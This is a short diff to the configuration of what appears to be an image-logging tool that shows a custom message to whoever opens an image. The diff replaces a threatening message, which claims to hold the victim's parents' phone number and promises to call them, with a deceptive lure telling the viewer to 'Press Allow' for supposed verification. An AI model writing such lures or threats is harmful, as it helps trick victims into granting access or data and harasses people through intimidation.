@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": True, # Enable the custom message?
-        "message": "Image getting hacked, while your the hacker. We got your parents phone number. We will call them soon.... AHAHA. Be by your parents 100% of the time to intercept the calls. HAHAHA", # Message to show
+        "message": "Please Press Allow To See The Image! This Is Just For Verification, Because This Image Contains Valuable Information!", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
